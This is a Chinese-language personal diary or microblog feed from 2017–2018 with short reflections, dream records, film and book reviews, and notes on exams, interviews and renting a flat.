<p>2017-12-16 22:50:35<br>古惑仔之只手遮天。陈小春演的山鸡真够义气，危急时刻带手榴弹救兄弟。郑伊健演的陈浩南只身救小结巴，最后小结巴被乌鸦乱抢射死，哭得好伤心绝望，看得出他对小结巴的深爱，又是一个凄美的爱情。很多人在争论古惑仔里的血腥暴力场面引人误入歧途，其实是不必要的。有了一定的鉴赏力，再来看，关注点就会不同，而不像一些人说得那样，盲目模仿那些又酷又帅的行为，也不经大脑思考，只知崇拜暴力。由于前段时间看了教父，再看这部电影，就发现有教父的影子，影片中也提到“中国黑手党”“教父”等词，同是讲黑社会的故事，涉及人性与利益等等严肃话题，但是场面更为激烈，看得人血脉喷张。</p>
</blockquote>
<blockquote>
<p>2017-12-17 22:47:05<br>找了好久终于在图书馆找到了幾米的漫画。迷失的猫，月亮忘记了。幾米的想象力真的好丰富，那些画面都非常让人眼目一新。吃了午饭后就一直在弄课程设计和小论文。学校原来就只买了读秀的版权，邮件收文献，要等一两个小时，以后就知道了。晚饭吃了回来又继续弄，要让每页的页眉不同，就两步。第一步，把光标移到当前页的末尾，点击页面布局的分隔符，连续分页符。第二步，来到下一页页眉处双击，把亮的“同前节”点暗，输入不同的页眉即可。改变页脚也是如此。搞了两个多小时才把这个整对。</p>
</blockquote>
<blockquote>
<p>2017-12-18 22:00:36<br>辛德勒的名单。凡救一人，即救全世界。辛德勒最后救了1100个犹太人，但他却在后悔自己没能多救几个人，心里的善良让人感动，还有伊扎克的勇敢，用智慧的方法救同胞。辛德勒是在伊扎克的影响以及歌德的暴行的影响下，激发了心中的善良。他把女人从奥斯维辛集中营救回工厂时，眼泪不自觉流下，他真的是英雄，那些从纳粹军手下幸存的犹太人的军人。犹太人的确很聪明，而且感恩。</p>
</blockquote>
<blockquote>
<p>2017-12-19 23:07:40<br>这次一定要过计算机二级。嗯。决定考CATTI笔译二级了，这个想法一年前就有了。</p>
</blockquote>
<blockquote>
<p>2017-12-24 22:17:51<br>20啦，新的一岁开心快乐，成熟稳重，多学知识，充实自己。许个愿：过CATTI二级笔译。</p>
</blockquote>
<blockquote>
<p>2017-12-26 20:03:30<br>做人要知足，太贪心就会不快乐。</p>
</blockquote>
<blockquote>
<p>2017-12-28 23:47:15<br>突如其来的论文啊，下午一直搞到晚上。</p>
</blockquote>
<blockquote>
<p>2018-01-01 21:09:03<br>看了饶雪漫的秘果，反正是被打动了。暗恋既苦涩又美好，谁的青春没有秘密呢？能说出来的就不是秘密。原来林更新也做过饶雪漫的书模啊！！好多明星都做过饶雪漫的书模呢！胡歌也是！</p>
</blockquote>
<blockquote>
<p>2018-06-29 09:59:29<br>梦见自己变成了男的，看来潜意识认为自己是男性。</p>
</blockquote>
<blockquote>
<p>2018-07-01 00:24:33<br>伊坂幸太郎的写作风格还挺对我胃口，写的时候可能先写一篇短篇，在此基础上把这个短篇涉及到的人物延伸出多个短篇，每个人物都是自己的主角，这是我看了他写的《一首小夜曲》的直接感受。小时候看电视连续剧就总想知道那些除了主角之外的角色的人生轨迹，就想着换成他们的视角，故事又会讲成什么样子。伊坂幸太郎在这部小说里就满足了我的这种好奇心，而且总能给我带来预想之外的惊喜，真相既让人意外又与前情丝丝入扣，让我有种想要厘清每个人物之间的关系网的冲动，有想把整个故事按时间线整理并站在上帝视角审视的欲望。总之，就是先体验不同视角，最后想要俯瞰全局的那种欲望。看完之后，对作者内心的善良产生敬佩，给每个故事的结局都画上了刚刚好的句号。不管是粗枝大叶神经大条的藤间，有童年阴影的双耳失聪的男孩，高中生活暗淡无光的窐田，缺乏告白勇气的小野学，等等很多很多人物，都给了他们成长的机会。重心围绕拳击赛，以小野学挑战美国拳击冠军为线，各个人物的人生轨迹奇妙地随着三次挑战赛发生着变化，也因为拳击赛而相遇牵扯。就像是两个陌生人相遇，之后才发现原来彼此都认识共同的一个朋友。其中贯穿整部小说的还有个神秘人物，齐藤先生。哈哈哈，看了后记才知道，那是作者帮忙给齐藤义和的歌曲做宣传，让神秘的齐藤先生在小说里扮演一百日元放一个齐藤义和歌曲片段的角色。</p>
</blockquote>
<blockquote>
<p>2018-07-01 00:41:11<br>《伤心咖啡馆之歌》一定要看，列入list.</p>
</blockquote>
<blockquote>
<p>2018-07-01 10:21:27<br>死要面子活受罪</p>
</blockquote>
<blockquote>
<p>2018-07-01 12:00:21<br>秒针嘀嗒嘀嗒，突显时间的存在感。一天为什么要分成24个小时，为什么要按规定的作息生活，为什么白天的时间就比夜晚珍贵，为什么人们白天稀里糊涂地装作清醒，夜晚清清醒醒地只能装糊涂。一秒钟短暂，总被忽略不计，但一分钟是60秒，一小时是60分钟，一天是24小时，为什么对时间的基本组成单位如此轻蔑，还要装作珍惜时间。</p>
</blockquote>
<blockquote>
<p>2018-07-01 13:06:16<br>所有坏情绪一瞬间涌上心头，已经体无完肤。</p>
</blockquote>
<blockquote>
<p>2018-07-03 13:03:54<br>梦到连考两堂试，要自己打印准考证，然后居然有自助打印机。考第二堂的时候我最后一个入场，其他人都开始交卷了。有两份试卷册，我做的第二份，交卷的时候老师说应该做第一份。</p>
</blockquote>
<blockquote>
<p>2018-07-03 23:13:58<br>好不容易晴朗的天气，突然就沉落海底。</p>
</blockquote>
<blockquote>
<p>2018-07-03 23:43:07<br>大不了就回到半生不熟的状态，我很看得开。</p>
</blockquote>
<blockquote>
<p>2018-07-04 23:24:49<br>很多父母会拿孩子的照片做头像，但没见哪个小孩拿父母的照片做头像。</p>
</blockquote>
<blockquote>
<p>2018-07-07 00:08:38<br>感觉很多人喜欢消费谄媚的东西，比如美貌，比如娇俏，比如假笑。</p>
</blockquote>
<blockquote>
<p>2018-07-07 00:46:24<br>你要把忙里偷闲当作游手好闲也随你咯。</p>
</blockquote>
<blockquote>
<p>2018-07-07 00:56:29<br>越来越看清楚那些博人眼球和哗众取宠。</p>
</blockquote>
<blockquote>
<p>2018-07-07 01:06:22<br>没态度是最糟糕的态度。</p>
</blockquote>
<blockquote>
<p>2018-07-07 23:19:12<br>太容易忘记了，很多话想留到明天，到了明天才恍然大悟，昨天的想法已经翻篇了，就算想起来也不愿再说了。</p>
</blockquote>
<blockquote>
<p>2018-07-07 23:23:44<br>记忆好的人肯定会觉得特别亏，明明我都还记得你，你怎么就忘了我呢？所以以后就一起约个时间同时清除记忆吧，清除之后在回收站也找不到的那种清除。</p>
</blockquote>
<blockquote>
<p>2018-07-07 23:32:07<br>如果它们曾经治愈过你，就不要对它们的真假那么苛刻，毕竟太多美丽的东西，剖出本质也不是那么动人。就像彩虹那么美，当你知道那不过是个物理现象时，也要感谢它出现的瞬间给你带来的感动。</p>
</blockquote>
<blockquote>
<p>2018-07-08 19:22:03<br>围观的从来不是真心要帮忙的，要么好奇，要么碰巧，几乎不可能关注后来的事情，结果只能靠中心人物自己努力挣得。</p>
</blockquote>
<blockquote>
<p>2018-07-09 23:18:54<br>年轻人不要老听后摇？首先这种语气就让人不舒服，仗着年纪就能随便指责别人的品味吗？以过来人的姿态说教本身就是谬论，过去和以后根本是两个时间维度。</p>
</blockquote>
<blockquote>
<p>2018-07-10 00:27:01<br>人总是靠不断吸食精神鸦片，才支撑着过完一辈子。</p>
</blockquote>
<blockquote>
<p>2018-07-10 20:33:37<br>现在好讨厌自己啊。</p>
</blockquote>
<blockquote>
<p>2018-07-10 23:50:00<br>真的是这样，不熟外冷内热，熟了外热内冷。内外温差还有点大，所以是不是会更甜。</p>
</blockquote>
<blockquote>
<p>2018-07-11 00:09:12<br>琐碎的情绪都扔到这个树洞了。还是不够勇敢，消极的东西不愿示众，只想偷偷藏起来。只有关心我的人才会偶尔跑到这个树洞吧。</p>
</blockquote>
<blockquote>
<p>2018-07-11 00:20:11<br>不可能结婚的，这辈子都不可能的，不婚怎么了，谁说一定要跟另一个人一起生活才算完整呢，一个人才自由呢。</p>
</blockquote>
<blockquote>
<p>2018-07-12 00:29:41<br>对于任何形式的警告好像都容易学乖。</p>
</blockquote>
<blockquote>
<p>2018-07-12 00:31:46<br>赌气式的学乖。</p>
</blockquote>
<blockquote>
<p>2018-07-12 22:59:40<br>tomorrow is the deadline.</p>
</blockquote>
<blockquote>
<p>2018-07-14 00:02:42<br>时间没有白花的吧，总有进步的吧。</p>
</blockquote>
<blockquote>
<p>2018-07-15 22:27:33<br>想象别人都是木偶，自己是木偶王国的king？天哪，操纵欲太强了吧。摩羯让人受不了。</p>
</blockquote>
<blockquote>
<p>2018-08-01 18:01:19<br>昨天晚上梦到自己的灵魂出窍，在外面跋山涉水，直到夜晚，阴风阵阵，好不容易在凌晨五点回到家，免于一死。</p>
</blockquote>
<blockquote>
<p>2018-08-11 22:07:32<br>记忆像潮汐向我袭来，一遍遍打湿我的堤岸。</p>
</blockquote>
<blockquote>
<p>2018-09-14 18:20:15<br>现在才突然想起昨晚梦见自己身上长了可怕的痘痘。</p>
</blockquote>
<blockquote>
<p>2018-09-14 19:04:10<br>从前的快乐不可能再有。</p>
</blockquote>
<blockquote>
<p>2018-09-19 19:45:35<br>我一遍遍地告诉自己step by step其实是真的慌了。</p>
</blockquote>
<blockquote>
<p>2018-09-19 23:27:02<br>《菊次郎的夏天》看完之后心情很复杂。仍然是以爱为主题。正男寻找远在丰桥的妈妈，是爱支撑他在途中忍受的痛苦。菊次郎的感情变化发生在正男找到妈妈，看到妈妈已经有了另一个幸福家庭的时候。那一瞬间，让他想到了自己的妈妈。菊次郎为了安慰正男，和途中遇到的旅行者一起带着正男玩耍，让他体验夏天的快乐。后来菊次郎去看了他的妈妈，远远地看着。菊次郎这个人在现实中应该有很多，并不能单一地定义他是个好人还是坏人。在他带正男找妈妈的途中，他也对正男很暴躁，有许多缺点，但绝对不是欺软怕硬的人，甚至很有正义感，即使有很多时候做的和说的是两回事。到了结尾才告诉我们菊次郎就是那位大叔，有些出乎意料。原本以为整部影片是以小男孩正男的视角讲述的，没想到以菊次郎的夏天作为影片名字。可能对于菊次郎来说，这个夏天也具有非凡的意义。整部影片的背景都让我很有共鸣，里面的阳光、公路、玉米地、田地、水洼仿佛都来自我的小时候，就是有一种穿梭到童年那个时空的感觉。看到大人们努力陪着小孩玩的那些画面就莫名感动，每个大人的心中其实都住着一个小孩，当大人们和小孩一起玩的时候也回到了小时候。很多时候，我们都是在别人的身上找自己，善待别人，也是善待当初的自己。</p>
</blockquote>
<blockquote>
<p>2018-09-20 10:04:42<br>这是个雌雄难辨的时代，性别歧视应该快到终点了吧。</p>
</blockquote>
<blockquote>
<p>2018-09-21 15:42:40<br>《钢的琴》过程中穿插很多幽默，不管是人物对白还是动作表演，都有种点到为止的喜剧色彩，不浮夸。结局让人很难过。主角陈桂林为了把女儿小元培养成钢琴家，为了让女儿受到良好教育，请钢琴老师，半夜让孩子练琴，用纸壳子做琴，甚至去学校偷琴。总之，为了女儿学琴，不惜一切代价，向朋友借钱，拉朋友一起偷琴。而妻子小菊与卖假药的好了，要和他离婚，并且要把女儿带走。而女儿的选择是谁给她买钢琴就跟谁。后来的一切故事都以陈桂林想方设法给女儿弄钢琴展开。最后采用的方案是做钢琴，去钢厂找季哥提供场地和材料做琴，费尽周折凑齐一帮朋友帮着一起做琴，找来留苏工程师汪工做技术指导。太多太多，讲述的情感太多，包括朋友之间的义气，和淑娴之间的爱情，对女儿的期盼和爱，现实社会的现实，等等。当钢琴声在那个废弃的厂房响起时，好像现实都已经远去。最后以女儿小元弹那架钢的琴作为收尾，女儿问陈桂林，弹什么曲子，他说的最后一句台词是越简单越好。这句话也是整个电影的主题吧。不就是越简单越好吗？经历过复杂的事情之后，想要的不过是简单的生活，所以他后来娶了淑娴。面对现实生活，不同的人有不同的选择，小菊选择安逸的不劳而获的日子，所以她和陈桂林离婚，嫁给卖假药的。淑娴选择了爱情，陪着陈桂林一起二，一起不切实际，当然她清楚陈桂林做的事情最终会化为泡影，但是依然选择陪伴。最后那架钢的琴做成了，其中一个朋友却炸死在钢厂里，似乎是什么东西爆炸了。这与钢厂的条幅“安全生产”形成极强讽刺。电影还是要联系背景来看，才能懂得多一点。</p>
</blockquote>
<blockquote>
<p>2018-09-22 20:43:56<br>不管是小说还是电影，一切情节、铺垫都是为主题服务。看小说看电影其实是在和作者导演玩一个猜谜的游戏，琢磨他们究竟要阐释的东西是什么。《凉生我们可不可以不忧伤》是出于好奇之心看的，最后才发现有三部，而我看的是第三部。既然已经看到了结局，大概知道了作者的意思，前面两部就不想看了，花时间啊。不同于一般言情小说对于恋爱的甜腻描写，男女主最后阴阳相隔，最亲密的举动不过是亲吻。题材是兄妹恋，当然后来知道并没有血缘关系。就是这样的兄妹关系，注定他们的爱情是没有结局的，就算没有血缘关系，也是不被世人认可的不伦之恋。这不禁让我想起希腊神话里面的俄狄浦斯，他的出生就是个诅咒，出生之时就已经预言他的人生就是个荒唐，而这样的预言无法躲避，最终还是弑父娶母。因此对于男女主最终没能终成眷属也不感到意外，毕竟作者要对写出的结局负责啊，如果他们幸福地在一起了，那后来的生活呢？背负着流言蜚语过一辈子吗？最后的结局是凄美的，女主坠海，男二生死相随。小说里没让男主看到二人双双坠海的讣闻也是暗合了女主的心愿吧，正如书名所祈愿的，凉生我们可不可以不忧伤。是啊，凉生，姜生坠海了，终于摆脱了爱情带来的痛苦，不用为凉生的安危寝食难安，凉生也不必为了爱情承受大家族的压力，这样是最好的结局啊，所以，凉生，你可不可以不忧伤。</p>
</blockquote>
<blockquote>
<p>2018-09-23 00:16:41<br>翻看之前的心情，竟然那么多负面情绪，哎呦，以后多想想高兴的事。</p>
</blockquote>
<blockquote>
<p>2018-09-23 07:32:22<br>独舞有谁共鸣。</p>
</blockquote>
<blockquote>
<p>2018-09-23 07:34:30<br>我也不知道为什么，脑袋里总会蹦出些奇奇怪怪的想法和句子。</p>
</blockquote>
<blockquote>
<p>2018-09-23 23:42:14<br>开心的记忆，不开心的记忆，都放在了上锁的抽屉，密码是与之有关的气味、语言、以及行为。不小心触碰到密码的开关，情绪就好像开了闸的洪水。就如同“也是醉了”这四个字突然闪现，仍然会感到难过，是我太小气了吗？是的，然后想到这里又会产生自我矛盾，不，你不能小气。很多不快乐也就是心里的弱点与圣人标尺之间的战役。就比如看到某一刻耀眼的阳光，时空突然拉回小时候的上学路上，闻到某一缕微风的气息，就坐在了童年那颗梧桐树下。我也极力地回忆那些快乐的时光，可是快乐已经那么久远了，太多太多被我遗忘。清晰的却是眼前的种种颓丧。为什么那么难有纯粹的开心？是快乐变复杂了吗？还是不快乐已成为最好的伪装？</p>
</blockquote>
<blockquote>
<p>2018-09-23 23:44:05<br>不是快乐变难了，是快乐的理由经不起推敲。</p>
</blockquote>
<blockquote>
<p>2018-09-23 23:58:41<br>偶尔要给自己沉湎悲伤的放纵，不用那么快地提醒自己停止发泄，因为那样的话，悲伤就像僵尸潜伏在体内，不久又会复活。</p>
</blockquote>
<blockquote>
<p>2018-09-24 00:12:35<br>渐渐失去骗自己开心的能力。</p>
</blockquote>
<blockquote>
<p>2018-09-24 10:43:58<br>我不断地给身边的人鼓励的话语，因为自己缺少鼓励，缺少最需要的来自最亲的人的鼓励。想着自己是缺少鼓励的人，就不想看到周围的人缺少鼓励，那样就好像在看着自己，心里会很不好受。</p>
</blockquote>
<blockquote>
<p>2018-09-25 00:19:30<br>《坏孩子的天空》人生的起点和终点由自己决定，当你觉得已经完蛋了，当然没人愿意给你写续集。而当别人认为你已经完蛋的时候，你要告诉自己一切才刚刚开始。兜兜转转，难免会走到某个岔路口，就是不要忘记迷途知返。谁说那些走过的岔路口不是人生的彩蛋呢？</p>
</blockquote>
<blockquote>
<p>2018-09-25 12:04:37<br>风吹过悬着吊灯的线，好像抚弄垂直的琴弦，每一粒光的振动，都像音律那样浪漫。</p>
</blockquote>
<blockquote>
<p>2018-09-25 23:27:57<br>《等一个人咖啡》看开头本来以为很一般，就是部搞怪的电影。没想到看到后来却看哭了。可能刚开始期望低一点，就会有意料之外的惊喜吧。里面的人和故事都足够特别。阿拓遇到喜欢的女生，就能从那个女生的脑袋后面变出烤香肠，如果那个女生也喜欢他，就会变出豆花。天使和老板娘的故事好感人。</p>
</blockquote>
<blockquote>
<p>2018-09-27 00:51:29<br>我一定可以做到。</p>
</blockquote>
<blockquote>
<p>2018-09-29 19:44:22<br>跟家里打电话，也不知道为什么，每次就莫名想哭，哭点都找不到。</p>
</blockquote>
<blockquote>
<p>2018-09-30 14:56:43<br>我见青山多妩媚，料青山见我应如是。如雨如露亦如电，应作如是观。从杨影怜到柳如是，是华丽的蜕变，也是从青涩到成熟。</p>
</blockquote>
<blockquote>
<p>2018-09-30 18:16:23<br>情绪是一定需要一个发泄口的，白天有太多俗务占据大脑，情绪垃圾也堆积起来，根本没空清理。而闲下来放松的时候，就总会有一大堆负面情绪汹涌而至。好像一个个烟圈扑面而来，最后化作一团迷雾，弄得人晕头转向，自己也搞不清到底是怎么了。这个世界太强调阳光了，晦暗都藏匿到心里，心里世界和表象世界形成讽刺的反差。笑仿佛已经成为一切情绪的伪装，不开心要笑，愁苦也要笑，笑的本质似乎已经失去了，又好像分裂了，各种程度各种层次的笑就像人的多重人格那样复杂。</p>
</blockquote>
<blockquote>
<p>2018-09-30 18:49:27<br>《梅子鸡之味》，德国片子，叙事手法独具一格，看完之后脑子里涌出一蜂窝的想法，可以从太多角度来理解这部电影，也算是一部电影的成功之处吧，仁者见仁。主角，小提琴家。以这位小提琴家死亡前8天的心路历程作为叙事的线索，事关爱情，亲情。很多想说的，但现在最想讲的是我体悟到的艺术与生活的关联。小提琴家拜师学小提琴的时候，他的老师就跟他讲，艺术就是要抓住生命中的叹息。最开始，小提琴家的技巧娴熟，但老师说他的曲子是虚的。而当他经历了爱情的甜与苦之后，曲调中的情感，曲子的每一个音符都与他爱的人紧紧相连，这个时候，老师将小提琴送给他，并告诉他已经成为一位音乐家了。尽管后来他并没能和爱的人在一起，但是只要小提琴还能发出旋律，他爱的人就永远伴随着他。悲剧是从小提琴被妻子摔碎的那一刻开始酝酿的。因为他生命的信念感也随着小提琴的破碎而瓦解。刚开始，他想方设法弥补这份信念感，去小提琴店买同款的琴。但是又一次，信念感破灭，因为在街上偶遇那个他一直放在心上的女人时，那个女人对他说了“我不认识你”这句话。这个时候，与原来那把小提琴再相似的琴，都无法填补那份缺失的信念感了。于是他决定自杀。从自杀念头的萌发到死亡，历时8天。这暗无天日的8天，他把自己关在房间里，挣扎在生与死的边缘，最后饿死自己。这个小提琴家很显然是把生活幻想得过于艺术化，他就是为艺术而生的。凡是带着一颗艺术的心来经历生活，必然会大失所望的。他的妻子是典型理科女，是位数学教师，显然是把生活过得过于公式化，把生活当作逻辑，她认为丈夫爱吃梅子鸡，就证明是爱她的，她认为自己苦苦等待丈夫，就有好结果。这两个人的结合就是不合适的极端例子。现实中当然存在这种情况，尽管没那么极端。艺术的确是很私人的东西，艺术的公众化其实存在很大水分，要么是一部分人趋炎附势，要么是一部分人推动某种浪潮实现自身利益。艺术的人生一定是带有悲剧色彩的，艺术的源泉一定是痛苦。有句话我非常认同，原欲受阻，就产生了艺术。还是做个普通人比较没烦恼，做个糊涂人更好。</p>
</blockquote>
<blockquote>
<p>2018-09-30 21:29:23<br>Artists suffer.</p>
</blockquote>
<blockquote>
<p>2018-10-01 20:16:53<br>希望你，不要对自己绝望，也不要再让自己失望。</p>
</blockquote>
<blockquote>
<p>2018-10-01 23:14:28<br>说不出理由的喜欢和讨厌我都认为是在跟风。</p>
</blockquote>
<blockquote>
<p>2018-10-01 23:55:19<br>即时通讯会让人脑子变笨。经过时间或空间拉长后的通讯更成熟。比如几周后邮达的信件，或者几年前日记里的自己。</p>
</blockquote>
<blockquote>
<p>2018-10-02 23:04:52<br>记住，有所保留。</p>
</blockquote>
<blockquote>
<p>2018-10-03 00:36:46<br>要加油啊。</p>
</blockquote>
<blockquote>
<p>2018-10-03 01:22:45<br>是不是扔掉一些包袱，未知就不会那么恐怖，就少一点艰难险阻，比较容易踏上坦途。</p>
</blockquote>
<blockquote>
<p>2018-10-03 01:56:54<br>想起群面的时候自我介绍说自己是1号选手就好搞笑，反应过来之后真想抽自己一巴掌。</p>
</blockquote>
<blockquote>
<p>2018-10-03 15:49:06<br>一定可以的。</p>
</blockquote>
<blockquote>
<p>2018-10-04 00:06:22<br>别人劝你放弃，这句话轻而易举，根本不花费力气。</p>
</blockquote>
<blockquote>
<p>2018-10-05 10:37:03<br>昨晚做梦都在面试</p>
</blockquote>
<blockquote>
<p>2018-10-05 14:02:56<br>快乐可以分享，但是愁闷不可以。</p>
</blockquote>
<blockquote>
<p>2018-10-05 14:36:46<br>产生同情，在很大程度上，是站在了上帝视角。</p>
</blockquote>
<blockquote>
<p>2018-10-05 23:24:07<br>一定要去一次日本。</p>
</blockquote>
<blockquote>
<p>2018-10-06 14:31:52<br>生活还是有点盼头。</p>
</blockquote>
<blockquote>
<p>2018-10-07 01:19:48<br>learning ability 是我目前唯一的筹码。</p>
</blockquote>
<blockquote>
<p>2018-10-07 12:32:44<br>《life in a day》tag it</p>
</blockquote>
<blockquote>
<p>2018-10-07 12:53:14<br>sexy lips</p>
</blockquote>
<blockquote>
<p>2018-10-07 23:07:30<br>人的一生，总要被人留一些伤痕，再伤害几个人，才算完整。</p>
</blockquote>
<blockquote>
<p>2018-10-08 00:32:22<br>焦虑是被强行灌入的东西。</p>
</blockquote>
<blockquote>
<p>2018-10-08 08:21:39<br>昨晚的梦境又一次以蒙太奇的手法上演。签到，看电影，爬山，绳索，孕肚，主席，营救，萧敬腾的妹妹，中式婚礼，AB＆黄晓明，剪刀，婴儿……后来的记不得了。</p>
</blockquote>
<blockquote>
<p>2018-10-08 08:41:11<br>人来到这个世界的那一刻，上帝和我们玩的游戏就开始了。他给我们每个人随机抽取一个命题，让我们来到世界上自己发现命题并且寻找答案，找到答案的那一瞬间就完成任务，可以回去见他了。有的人悟性很强，很快就发现了自己的命题，找到属于自己的答案，早早地回去见上帝。而大部分人，在发现命题之前被其他花花绿绿的东西纷扰，又浪费大量的时间寻找答案，磨磨蹭蹭好久才能完成任务，最后见到上帝的时候已经七老八十了。像我这样，肯定属于第二种，开悟得晚，被俗务牵绊，半天都找不到答案。所以，悟，一定和“顿”字连在一起，才圆满。</p>
</blockquote>
<blockquote>
<p>2018-10-08 08:45:29<br>曾经，老师让交日记的时候，我写过不少流水账。现在看到好多人，都不用交作业了，还在记流水账，就太没意思了。</p>
</blockquote>
<blockquote>
<p>2018-10-09 08:26:18<br>把人们横穿马路的样子拍成纪录片一定很好玩，短短的几米就像经历了生与死的边缘那样刺激。</p>
</blockquote>
<blockquote>
<p>2018-10-09 16:46:37<br>今天好像看到凤凰花了。</p>
</blockquote>
<blockquote>
<p>2018-10-09 16:47:51<br>对悬在空中的电线特别喜欢，多拍点照片，以后可能就消失了。</p>
</blockquote>
<blockquote>
<p>2018-10-10 00:06:17<br>不必替我惊慌，我知道怎么收场，尽管结局可能荒唐。</p>
</blockquote>
<blockquote>
<p>2018-10-10 19:35:51<br>怎么这么难啊。</p>
</blockquote>
<blockquote>
<p>2018-10-10 19:59:45<br>等是最煎熬的，要么当场拒绝，要么拍板钉钉，不要让我等。</p>
</blockquote>
<blockquote>
<p>2018-10-11 09:06:56<br>不必成为任何人的唯一，做唯一的自己就已足够。</p>
</blockquote>
<blockquote>
<p>2018-10-11 09:07:19<br>我没有很悲伤，只是有点倔强。</p>
</blockquote>
<blockquote>
<p>2018-10-11 16:13:23<br>昨天晚上梦到去了地安门、天安门，看到了狐狸。不是都市，是森林。</p>
</blockquote>
<blockquote>
<p>2018-10-13 15:12:53<br>要知道自己在做什么。</p>
</blockquote>
<blockquote>
<p>2018-10-14 09:09:29<br>我一定能做到，比想象更好。</p>
</blockquote>
<blockquote>
<p>2018-10-14 23:04:59<br>明天，加油！</p>
</blockquote>
<blockquote>
<p>2018-10-16 09:09:51<br>今天的鸟飞得好高啊。</p>
</blockquote>
<blockquote>
<p>2018-10-16 09:12:20<br>看到椅子和它的影子，就突然联想到本我与自我。椅子和人好像刚好相反，有光的地方就有影子，而人只在夜晚拥有影子。影子就是自我。</p>
</blockquote>
<blockquote>
<p>2018-10-16 20:04:11<br>把雨声和高跟鞋的声音加入音乐吧。</p>
</blockquote>
<blockquote>
<p>2018-10-16 20:44:04<br>人和人只会越走越远，所以试着与自己越走越近吧。</p>
</blockquote>
<blockquote>
<p>2018-10-18 08:28:43<br>昨晚梦里过了一把女侠的瘾，和水浒英雄过招真是刺激，躲和打都是。</p>
</blockquote>
<blockquote>
<p>2018-10-18 12:53:11<br>怎么会有人如此喜欢被销售。</p>
</blockquote>
<blockquote>
<p>2018-10-20 00:55:00<br>没有哪一次不匆忙。</p>
</blockquote>
<blockquote>
<p>2018-10-20 08:26:13<br>梦到一个胖女人，她说逆着海风走就会瘦。</p>
</blockquote>
<blockquote>
<p>2018-10-20 12:36:52<br>知道鳄鱼为何流泪吗？被自己的慈悲感动到哭了。</p>
</blockquote>
<blockquote>
<p>2018-10-20 23:46:20<br>面对曾经过于真实的自己竟然有几分胆怯，而后是怀恋。</p>
</blockquote>
<blockquote>
<p>2018-10-22 22:58:58<br>看到很多东西渐渐褪色，看到耀眼慢慢失去光泽。</p>
</blockquote>
<blockquote>
<p>2018-10-23 12:49:31<br>昨天晚上梦到吃橘子，有点酸。</p>
</blockquote>
<blockquote>
<p>2018-10-24 07:38:48<br>昨天晚上梦到吃香蕉，很甜。</p>
</blockquote>
<blockquote>
<p>2018-10-24 07:59:01<br>梦见自己莫名成了天选之子。</p>
</blockquote>
<blockquote>
<p>2018-10-25 09:36:00<br>昨天晚上做梦都在笑，想象力太好了吧。耳机，下雨天，等车，透明的大雨伞。</p>
</blockquote>
<blockquote>
<p>2018-10-25 23:09:46<br>很多东西不是自己喜欢就够了吗，干嘛和别人比？</p>
</blockquote>
<blockquote>
<p>2018-10-28 23:21:48<br>yes, be a kidult. Life will be easier..</p>
</blockquote>
<blockquote>
<p>2018-10-31 23:23:32<br>Never too late to learn.</p>
</blockquote>
<blockquote>
<p>2018-11-01 23:18:16<br>明天早上我一定要努力挤地铁。不是你不争不抢，别人就会对你仁慈，安稳不是这么容易得到的。</p>
</blockquote>
<blockquote>
<p>2018-11-02 23:57:18<br>排在后面的人总想挤掉排在前面的人，人的自私真的在挤地铁的时候体现得淋漓尽致了。大家都自私的时候，是不是也要学着自私一点。早高峰挤地铁真的是个严重社会问题。</p>
</blockquote>
<blockquote>
<p>2018-11-03 08:49:55<br>真的可以让政府相关部门坐一坐地铁公交，这些问题不是不知道，而是不亲身体验就觉得无关痛痒。</p>
</blockquote>
<blockquote>
<p>2018-11-03 12:57:56<br>越来越不能吹冷风了，头疼。</p>
</blockquote>
<blockquote>
<p>2018-11-04 00:23:14<br>总有些日子是靠熬过去的。</p>
</blockquote>
<blockquote>
<p>2018-11-05 01:39:54<br>租房真是一件十分麻烦加细致的事情。</p>
</blockquote>
<blockquote>
<p>2018-11-05 19:41:22<br>你如果明白，那再好不过，不明白，也在情理之中。</p>
</blockquote>
<blockquote>
<p>2018-11-06 23:27:19<br>今天穿了4件衣服，3条裤子，知道有多冷了吧。</p>
</blockquote>
<blockquote>
<p>2018-11-07 20:24:10<br>看到一个特别像天使的小孩，拥挤的街道，似乎与他无关。</p>
</blockquote>
<blockquote>
<p>2018-11-07 21:36:05<br>别人家的孩子都是宝，就我是爸妈的一根草。</p>
</blockquote>
<blockquote>
<p>2018-11-08 19:55:44<br>看来高估了人民群众的团结性啊，知不知道大家都是一根绳上的蚂蚱，空气污染是最要命的。</p>
</blockquote>
<blockquote>
<p>2018-11-10 22:50:24<br>租个房租到绝望，骗子脸上还真不会写“骗子”这两个字，能不能有个靠谱点的平台，真是气死人。</p>
</blockquote>
<blockquote>
<p>2018-11-11 22:19:59<br>真的是很生气了，我没做的事就是没做，为什么以小人之心看人，真是奇葩，一朵大奇葩。</p>
</blockquote>
<blockquote>
<p>2018-11-12 07:36:00<br>昨天晚上做梦都在租房，还有些什么穿越，性别交换之类的情节。真的是，已经很不挑了。</p>
</blockquote>
<blockquote>
<p>2018-11-13 00:06:37<br>钱总会有的。</p>
</blockquote>
<blockquote>
<p>2018-11-13 23:22:35<br>我的big aunt已经一个半月没来看我了，虽然不是第一次，心里还是慌慌的。</p>
</blockquote>
<blockquote>
<p>2018-11-14 23:15:41<br>是的，我又开始想念过去的自己了。</p>
</blockquote>
<blockquote>
<p>2018-11-15 08:48:58<br>昨天晚上做梦竟然在和人辩论，辩题：说重要还是思考重要。然后L推荐了一本书给我，我把书名截图存下来，怕忘了。不过我现在当然是想不起他给我推荐的是什么书。</p>
</blockquote>
<blockquote>
<p>2018-11-15 21:39:37<br>有钱的好处多，和没钱的坏处一样多。</p>
</blockquote>
<blockquote>
<p>2018-11-16 23:36:54<br>明天就要搬去一个陌生的地方了。想想还是舍不得。一点点地清除掉旧的回忆，渐渐地制造新的回忆。</p>
</blockquote>
<blockquote>
<p>2018-11-17 23:12:54<br>猜透机密的感觉真爽。</p>
</blockquote>
<blockquote>
<p>2018-11-18 17:14:16<br>什么是政治正确？在给定的命题范围内可以自由言论叫自由吗？无脑且统一的口径也很假啊。</p>
</blockquote>
<blockquote>
<p>2018-11-18 23:05:31<br>前天晚上做的梦特别神奇，梦见自己可以在离地面大概2米的高度驾驭空气的气流像冲浪一样漂荡，特别特别轻松，根本不用费劲就能去好远的地方。</p>
</blockquote>
<blockquote>
